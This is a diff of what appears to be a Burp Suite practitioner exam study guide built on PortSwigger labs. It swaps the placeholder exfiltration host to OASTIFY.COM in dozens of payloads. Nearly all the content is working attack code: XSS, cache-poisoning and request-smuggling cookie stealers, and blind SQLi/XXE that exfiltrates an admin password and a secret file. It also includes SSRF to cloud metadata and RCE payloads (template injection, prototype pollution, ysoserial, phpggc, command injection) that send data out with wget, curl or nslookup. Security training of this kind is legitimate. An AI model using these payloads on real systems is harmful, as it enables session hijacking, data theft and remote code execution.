@@ -83,7 +83,7 @@
 >Out of band XInclude request, need hosted DTD to read local file.  
 
 ```xml
-<hqt xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://COLLABORATOR.NET/foo"/></hqt>
+<hqt xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://OASTIFY.COM/foo"/></hqt>
 ```  
 
 [PortSwigger Lab: Discovering vulnerabilities quickly with targeted scanning](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning)  
@@ -212,7 +212,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 >[PortSwigger cheat sheet for cross site scripting reference](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.0.1---1.1.5-(shorter))  
 
 ```JavaScript
-{{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}
+{{$on.constructor('document.location="https://OASTIFY.COM?c="+document.cookie')()}}
 ```  
 
 >**Note:** The session cookie property must not have the **HttpOnly** secure flag set in order for XSS to succeed.  
@@ -240,7 +240,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 >DOM XSS cookie stealer payload in a `document.write` sink using source `location.search` inside a `<select>` element. This can be send to victim via exploit server in `<iframe>`. To test the cookie stealer payload I again on my browser in console added a test POC cookie to test sending it to Collaborator.  
 
 ```html
-"></select><script>document.location='https://COLLABORATOR.com/?domxss='+document.cookie</script>//
+"></select><script>document.location='https://OASTIFY.COM/?domxss='+document.cookie</script>//
 ```  
 
 ![dom-xss](images/dom-xss.png)  
@@ -292,7 +292,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 ```html
 <iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
     "type": "load-channel",
-    "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
+    "url": "JavaScript:document.location='https://OASTIFY.COM?c='+document.cookie"
 }), "*");'>
 
 ```  
@@ -308,7 +308,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 ```JSON
 {
     "type": "load-channel",
-    "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
+    "url": "JavaScript:document.location='https://OASTIFY.COM?c='+document.cookie"
 }
 ```  
 
@@ -325,7 +325,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 >The exploit server hosted payload below includes the ```https``` string, and is successful in bypassing the `if` condition check.  
 
 ```html
-<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:document.location=`https://Collaborator.com?c=`+document.cookie','*')">
+<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:document.location=`https://OASTIFY.COM?c=`+document.cookie','*')">
 ```  
 
 ![DOM-XSS AddEventListener JavaScript URL](images/DOM-XSS-AddEventListener-JavaScript-URL.png)  
@@ -341,7 +341,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 >The ```fetch``` function enclose the collaborator target inside **back ticks**, and when the iframe loads on the victim browser, the `postMessage()` method sends a web message to their home page.  
 
 ```html
-<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://COLLABORATOR.com?collector=`+btoa(document.cookie))>','*')">
+<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://OASTIFY.COM?collector=`+btoa(document.cookie))>','*')">
 ```  
 
 >Replacing the Burp Lab payload ```print()``` with ```fetch()``` in the above code allow attacker to steal the victim session cookie.  
@@ -365,7 +365,7 @@ From the Site Map, open the `searchResults.js` file and notice that the JSON res
 >Above payload validate that the backslash **\\** is not sanitized, and the JSON data is then send to `eval()`.  Backslash is not escaped correctly and when the JSON response attempts to escape the opening double-quotes character, it adds a **second** backslash. The resulting double-backslash causes the escaping to be effectively **cancelled out**.  
 
 ```JavaScript
-\"-fetch('https://COLLABORATOR.com?reflects='+document.cookie)}//
+\"-fetch('https://OASTIFY.COM?reflects='+document.cookie)}//
 ```  
 
 >In the above payload every character is URL encoded and used as the search parameter value. This target do not have an exploit server, so I hosted my own `python3 -m http.server 80` web service and save the `index.html` file that contain the `location` target URL between `<script>` tags. 
@@ -484,7 +484,7 @@ document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
 >Below JavaScript is hosted on exploit server and then deliver to victim. The `code` is an iframe doing **onload** and the search parameter is vulnerable to **onpopstate**.  
 
 ```JavaScript
-<iframe onload="if(!window.flag){this.contentWindow.location='https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>#';flag=1}" src="https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>"></iframe>
+<iframe onload="if(!window.flag){this.contentWindow.location='https://TARGET.net?search=<body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie>#';flag=1}" src="https://TARGET.net?search=<body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie>"></iframe>
 ```  
 
 ### Bypass Blocked Tags   
@@ -492,13 +492,13 @@ document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
 >Application controls give message, ***"Tag is not allowed"*** when inserting basic XSS payloads, but discover SVG mark-up allowed using above [methodology](#identify-allowed-tags). This payload steal my own session cookie as POC.  
 
 ```html
-https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2Fcollaboration.net%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E
+https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E
 ```  
 
 >Place the above payload on exploit server and insert URL with search value into an ```iframe``` before delivering to victim in below code block.  
 
 ```html
-<iframe src="https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FCOLLABORATOR.com%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E">
+<iframe src="https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E">
 </iframe>
 ```  
   
@@ -511,7 +511,7 @@ https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocume
 >Lab to test XSS into HTML context with nothing encoded in search function. Using this lab to test the **Assignable protocol with location** ```javascript``` exploit ***identified*** by [PortSwigger XSS research](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#assignable-protocol-with-location). In the payload is the ```%0a``` representing the ASCII newline character.  
 
 ```html
-<script>location.protocol='javascript';</script>#%0adocument.location='http://COLLABORATOR.NET/?p='+document.cookie//&context=html
+<script>location.protocol='javascript';</script>#%0adocument.location='http://OASTIFY.COM/?p='+document.cookie//&context=html
 ```  
 
 ![XSS protocol location](images/xss-protocol-location.png)  
@@ -530,7 +530,7 @@ https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocume
 
 ```
 <script>
-location = 'https://TARGET.net/?search=<xss+id=x+onfocus=document.location='https://Collaborator.COM/?c='+document.cookie tabindex=1>#x';
+location = 'https://TARGET.net/?search=<xss+id=x+onfocus=document.location='https://OASTIFY.COM/?c='+document.cookie tabindex=1>#x';
 </script>
 ```
    
@@ -538,7 +538,7 @@ location = 'https://TARGET.net/?search=<xss+id=x+onfocus=document.location='http
 
 ```
 <script>
-location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location%3D%27https%3A%2F%2FCOLLABORATOR.COM%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
+location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
 </script>
 ```  
 
@@ -553,7 +553,7 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 >Below iframe uses **HASH** `#` character at end of the URL to trigger the **OnHashChange** XSS cookie stealer.  
   
 ```JavaScript
-<iframe src="https://TARGET.net/#" onload="document.location='http://COLLABORATOR.com/?cookies='+document.cookie"></iframe>
+<iframe src="https://TARGET.net/#" onload="document.location='http://OASTIFY.COM/?cookies='+document.cookie"></iframe>
 ```  
 
 >Note if the cookie is secure with **HttpOnly** flag set enabled, the cookie cannot be stolen using XSS.  
@@ -604,7 +604,7 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 >Changing the payload to a cookie stealer that deliver the session token to Burp Collaborator. 
 
 ```html
-</script><script>document.location="https://Collaborator.net/?cookie="+document.cookie</script>
+</script><script>document.location="https://OASTIFY.COM/?cookie="+document.cookie</script>
 ```  
 
 ![collaborator get cookies](images/collaborator-get-cookies.png)  
@@ -616,14 +616,14 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 >In BSCP exam host the below payload on exploit server inside `<script>` tags, and the search query below before it is URL encoded.  
 
 ```
-</ScRiPt ><img src=a onerror=document.location="https://COLLABORATOR.com/?biscuit="+document.cookie>
+</ScRiPt ><img src=a onerror=document.location="https://OASTIFY.COM/?biscuit="+document.cookie>
 ```  
 
 >Exploit Server hosting search term reflected vulnerability that is send to victim to obtain their session cookie.  
 
 ```html
 <script>
-location = "https://TARGET.net/?search=%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3Ddocument.location%3D%22https%3A%2F%2FCOLLABORATOR.com%2F%3Fbiscuit%3D%22%2Bdocument.cookie%3E"
+location = "https://TARGET.net/?search=%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3Ddocument.location%3D%22https%3A%2F%2FOASTIFY.COM%2F%3Fbiscuit%3D%22%2Bdocument.cookie%3E"
 </script>
 ```  
 
@@ -644,7 +644,7 @@ fuzzer\';alert(`Testing The backtick a typographical mark used mainly in computi
 >Using a single **backslash**, single quote and **semicolon** we escape out of the JavaScript string variable, then using back ticks to enclose the ```document.location``` path, allow for the cookie stealer to bypass application protection.  
 
 ```
-\';document.location=`https://COLLABORATOR.com/?BackTicks=`+document.cookie;//
+\';document.location=`https://OASTIFY.COM/?BackTicks=`+document.cookie;//
 ```  
 
 >With help from Trevor I made this into cookie stealer payload, using back ticks. Thanks Trevor, here is his Youtube walk through [XSS JavaScript String Angle Brackets Double Quotes Encoded Single](https://youtu.be/Aqfl2Rj0qlU?t=598)  
@@ -772,7 +772,7 @@ ${alert(document.cookie)}
 >Below is the main cookie stealer payload before BASE 64 encoding it.  
 
 ```JavaScript
-fetch(`https://COLLABORATOR.com/?jsonc=` + window["document"]["cookie"])
+fetch(`https://OASTIFY.COM/?jsonc=` + window["document"]["cookie"])
 ```  
 
 >Next is encode payload using [Base64 encoded](https://www.base64encode.org/) value of the above cookie stealer payload.  
@@ -916,7 +916,7 @@ alert(document.getElementsByClassName("navbar-brand")[0].innerText)
 >The modified PortSwigger lab payload assign the `document.location` function to the variable `defaultAvatar` next time page is loaded, because site uses DOMPurify that allows the use of `cid:` protocol that do not URLencode double quotes.  
 
 ```
-<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=document.location=`https://COLLABORATOR.com/?clobber=`+document.cookie//">
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=document.location=`https://OASTIFY.COM/?clobber=`+document.cookie//">
 ```  
 
 [PortSwigger Lab: Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)  
@@ -928,7 +928,7 @@ alert(document.getElementsByClassName("navbar-brand")[0].innerText)
 ![stored dom-xss code replace](images/stored-dom-xss-code.png)  
 
 ```html
-<><img src=1 onerror=javascript:fetch(`https://COLLABORATOR.com?escape=`+document.cookie)>
+<><img src=1 onerror=javascript:fetch(`https://OASTIFY.COM?escape=`+document.cookie)>
 ```  
 
 >Above payload is stored and any user visiting the comment blog will result in their session cookie being stolen and send to collaborator.  
@@ -974,7 +974,7 @@ X-Host: EXPLOIT.net
 >Body send session cookie to collaboration service.  
   
 ```javascript
-document.location='https://collaboration.net/?cookies='+document.cookie;
+document.location='https://OASTIFY.COM/?cookies='+document.cookie;
 ```  
 
 >Keep **Poisoning** the web cache of target by resending request with ```X-Forwarded-Host``` header.  
@@ -996,7 +996,7 @@ document.location='https://collaboration.net/?cookies='+document.cookie;
 ![Cache query reflected](images/cache-query-reflected.png)  
   
 ```
-GET /?utm_content='/><script>document.location="https://Collaborator.com?c="+document.cookie</script>
+GET /?utm_content='/><script>document.location="https://OASTIFY.COM?c="+document.cookie</script>
 ```  
 
 >Above payload is cached and the victim visiting target cookie send to Burp collaborator.  
@@ -1021,13 +1021,13 @@ GET /js/geolocate.js?callback=setCountryCookie&utm_content=fuzzer;callback=EVILF
 >Cache Cloaking Cookie Capturing payload below, keep poising cache until victim hits stored cache.  
 
 ```
-GET /js/geolocate.js?callback=setCountryCookie&utm_content=fuzzer;callback=document.location='https://COLLABORATOR.com?nuts='%2bdocument.cookie%3b HTTP/2
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=fuzzer;callback=document.location='https://OASTIFY.COM?nuts='%2bdocument.cookie%3b HTTP/2
 ```  
 
 >Below is [Url Decoded](https://www.urldecoder.org/) payload.  
 
 ```
-GET/js/geolocate.js?callback=setCountryCookie&utm_content=fuzzer;callback=document.location='https://COLLABORATOR.com?nuts='+document.cookie; HTTP/2
+GET/js/geolocate.js?callback=setCountryCookie&utm_content=fuzzer;callback=document.location='https://OASTIFY.COM?nuts='+document.cookie; HTTP/2
 ```  
 
 [PortSwigger Lab: Parameter cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)  
@@ -1044,7 +1044,7 @@ Host: exploit.net
 >On the exploit server set a file as same path target calls to ```/resources/js/tracking.js```, this will contain the payload. Place the JavaScript payload code below to perform a cookie stealer.  
 
 ```
-document.location='https://Collaborator.com/?CacheCookies='+document.cookie;
+document.location='https://OASTIFY.COM/?CacheCookies='+document.cookie;
 ```  
 
 ![Ambiguous Hosts](images/ambiguous-hosts.png)  
@@ -1069,7 +1069,7 @@ X-Forwarded-Scheme: nothttps
 >On the exploit server change the file path to ```/resources/js/tracking.js``` and the update the poison request ```X-Forwarded-Host: EXPLOIT.net``` header. Place the payload on exploit server body.  
 
 ```html
-document.location='https://Collaborator.com/?poisoncache='+document.cookie;
+document.location='https://OASTIFY.COM/?poisoncache='+document.cookie;
 ```  
 
 >Remove the ```cb=123``` cache **buster**, and then poison the cache until the victim is redirected to the exploit server payload tracking.js to steal session cookie.  
@@ -1206,7 +1206,7 @@ Transfer-encoding: identity
 
 e6
 GET /post?postId=4 HTTP/1.1
-User-Agent: a"/><script>document.location='http://COLLABORATOR.com/?c='+document.cookie;</script>
+User-Agent: a"/><script>document.location='http://OASTIFY.COM/?c='+document.cookie;</script>
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 15
 
@@ -1334,7 +1334,7 @@ csrf=ValidCSRFCookieValue&postId=8&name=c&email=c%40c.c&website=&comment=c
 >COOKIE STEALER Payload.  
 
 ```JavaScript
-a"/><script>document.location='http://Collaborator.com/?cookiestealer='+document.cookie;</script>
+a"/><script>document.location='http://OASTIFY.COM/?cookiestealer='+document.cookie;</script>
 ```  
 
 >Smuggle this XSS request to the back-end server, so that it exploits the next visitor. Place the XSS cookie stealer in **User-Agent** header.  
@@ -1349,7 +1349,7 @@ Transfer-Encoding: chunked
 0
 
 GET /post?postId=4 HTTP/1.1
-User-Agent: a"/><script>document.location='http://COLLABORATOR.com/?Hack='+document.cookie;</script>
+User-Agent: a"/><script>document.location='http://OASTIFY.COM/?Hack='+document.cookie;</script>
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 5
 
@@ -1801,7 +1801,7 @@ csrf=TOKEN&username=administrator
         ws.send("READY");
     };
     ws.onmessage = function(event) {
-        fetch('https://COLLABORATOR.com', {method: 'POST', mode: 'no-cors', body: event.data});
+        fetch('https://OASTIFY.COM', {method: 'POST', mode: 'no-cors', body: event.data});
     };
 </script>
 ```  
@@ -1825,7 +1825,7 @@ https://cms-TARGET.net/login?username=%3Cscript%3Ealert%28%27reflectXSS%27%29%3C
         ws.send("READY");
     };
     ws.onmessage = function(event) {
-        fetch('https://COLLABORATOR.com', {method: 'POST', mode: 'no-cors', body: event.data});
+        fetch('https://OASTIFY.COM', {method: 'POST', mode: 'no-cors', body: event.data});
     };
 </script>
 ```  
@@ -1984,7 +1984,7 @@ https://cms-TARGET.net/login?username=%3Cscript%3Ealert%28%27reflectXSS%27%29%3C
 >Target is vulnerable to Out of band data exfiltration using Blind SQL exploitation query. In this case the trackingID cookie.  Below is combination of SQL injection and XXE payload to exploit the vulnerability and send administrator password as DNS request to the collaborator service.  
 
 ```sql
-TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.COLLABORATOR.NET/">+%25remote%3b]>'),'/l')+FROM+dual--
+TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.OASTIFY.COM/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```  
 
 ![Blind SQL injection with out-of-band data exfil](images/blind-SQL-injection-out-of-band-exfil.png)  
@@ -1998,7 +1998,7 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
 >Placing a single quote at end of the ```trackingid``` cookie or search parameter `/search_advanced?searchTerm='` may give response `500 Internal Server Error`. Make an educated guess, by using below blind SQLi payload and combine with basic XXE technique, this then makes a call to collaboration server but no data is ex-filtrated.  
 
 ```sql
-TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//COLLABORATOR.NET/">+%25remote%3b]>'),'/l')+FROM+dual--
+TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//OASTIFY.COM/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```  
   
 ![SQLi XXE](images/sqli-XXE.png)  
@@ -2716,7 +2716,7 @@ Origin: http://subdomain.TARGET.NET
 
 ```xml
 <!ENTITY % file SYSTEM "file:///home/carlos/secret">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR.net/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://OASTIFY.COM/?x=%file;'>">
 %eval;
 %exfil;
 ```  
@@ -2857,7 +2857,7 @@ Host: localhost
 
 ```html
 GET https://TARGET.net/
-Host: COLLABORATOR.NET
+Host: OASTIFY.COM
 ```  
 
 ![identify ssrf flawed request parsing host header](images/identify-ssrf-host.png)  
@@ -2886,7 +2886,7 @@ Content-Length: 206
 
 {
 "redirect_uris":["https://example.com"],
-    "logo_uri" : "https://Collaborator.com",
+    "logo_uri" : "https://OASTIFY.COM",
 	"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
 	
 }  
@@ -2970,7 +2970,7 @@ body: JSON.stringify({
 >**Note:** The `<div>` tag defines a division or a section in an HTML document. The <div> tag is used as a container for HTML elements - which is then styled with CSS. [z3nsh3ll explain HTML DIV demarcation and SPAN different ways to style the elements.](https://youtu.be/5djtMMciBlw)   
 
 ```html
-<div><p>Report Heading by <img src="https://Collaborator.com/test.png"></p>
+<div><p>Report Heading by <img src="https://OASTIFY.COM/test.png"></p>
 ```  
 
 >Identify file download HTML-to-PDF convert function on target is vulnerable.  
@@ -3201,7 +3201,7 @@ wrtz{{#with "s" as |string|}}
             {{this.pop}}
             {{#with string.split as |codelist|}}
                 {{this.pop}}
-                {{this.push "return require('child_process').exec('wget https://COLLABORATOR.net --post-file=/home/carlos/secret');"}}
+                {{this.push "return require('child_process').exec('wget https://OASTIFY.COM --post-file=/home/carlos/secret');"}}
                 {{this.pop}}
                 {{#each conslist}}
                     {{#with (string.sub.apply 0 codelist)}}
@@ -3247,7 +3247,7 @@ wrtz{{#with "s" as |string|}}
 ```JSON
 "__proto__": {
     "execArgv":[
-        "--eval=require('child_process').execSync('curl https://COLLABORATOR.com')"
+        "--eval=require('child_process').execSync('curl https://OASTIFY.COM')"
     ]
 }
 ```  
@@ -3586,7 +3586,7 @@ O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
 >Use below payload in the Deserialization scanner exploiting Java jar ysoserial command, to obtain remote code execution (RCE) when payload de-serialized on target.  
  
 ```
-CommonsCollections3 'wget http://Collaborator.net --post-file=/home/carlos/secret'
+CommonsCollections3 'wget http://OASTIFY.COM --post-file=/home/carlos/secret'
 ```  
 
 >Image below is from the Practice exam, I have some issues with my setup as the old version of java is needed when running `ysoserial` in bash terminal, and the Burp Suite Pro app need `sudo` to save the config of the extension.  
@@ -3615,7 +3615,7 @@ java --version
 >Now execute ```ysoserial``` to generate base64 payload, using Java version 11. Replace session cookie with generated base64 payload and URL encode only the key characters before sending request.  
 
 ```bash
-java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collaborator.net --post-file=/home/carlos/secret' | base64 -w 0
+java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://OASTIFY.COM --post-file=/home/carlos/secret' | base64 -w 0
 ```  
 
 ![ysoserial Command](images/ysoserial-command.png)  
@@ -3631,7 +3631,7 @@ java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collabor
 >Exploit steps to perform a PHP deserialization with a pre-built gadget chain.  
 
 1. Request the ```/cgi-bin/phpinfo.php``` file to find the leaked ```SECRET_KEY``` information about the website.  
-2. Generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony ```phpggc Symfony/RCE4 exec 'wget http://Collaborator.com --post-file=/home/carlos/secret' | base64 -w 0```.  
+2. Generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony ```phpggc Symfony/RCE4 exec 'wget http://OASTIFY.COM --post-file=/home/carlos/secret' | base64 -w 0```.  
 3. Construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained.  
 
 ```php
@@ -3675,16 +3675,16 @@ echo $cookie;
  \n
 ```  
 
->The target application **submit feedback** function require email value, and ***identifying*** blind OS command injection by appending ```||curl COLLABORATOR.net||``` bash command, we then can observe a request made to Collaborator.  
+>The target application **submit feedback** function require email value, and ***identifying*** blind OS command injection by appending ```||curl OASTIFY.COM||``` bash command, we then can observe a request made to Collaborator.  
   
 ```bash
-email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
+email=carlos@exam.net||curl+`whoami`.OASTIFY.COM||
 ```  
 
 >The below payload use DNS exfiltration and the Burp Collaborator DNS service.  
 
 ```
-||$(curl $(cat /home/carlos/secret).COLLABORATOR.com)||
+||$(curl $(cat /home/carlos/secret).OASTIFY.COM)||
 ```  
 
 >In this YouTube video [Leet Cipher](https://youtu.be/o7oVWXw4t5E) show how to use DNS rebinding with blind command injection to exfiltration the contents of `passwd` from the target by first uploading bash script that Base64 and then Base58 encode the `passwd` file content, to strip special character not able to ex-filtrate with DNS label restrictions.  
@@ -3696,7 +3696,7 @@ email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
 >PortSwigger Lab payload perform a DNS lookup using `nslookup` as a Burp Collaborator subdomain.  
 
 ```
-email=peanut2019@nuts.net||nslookup+`whoami`.COLLABORATOR.NET||
+email=peanut2019@nuts.net||nslookup+`whoami`.OASTIFY.COM||
 ```  
 
 [PortSwigger Lab: Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)  
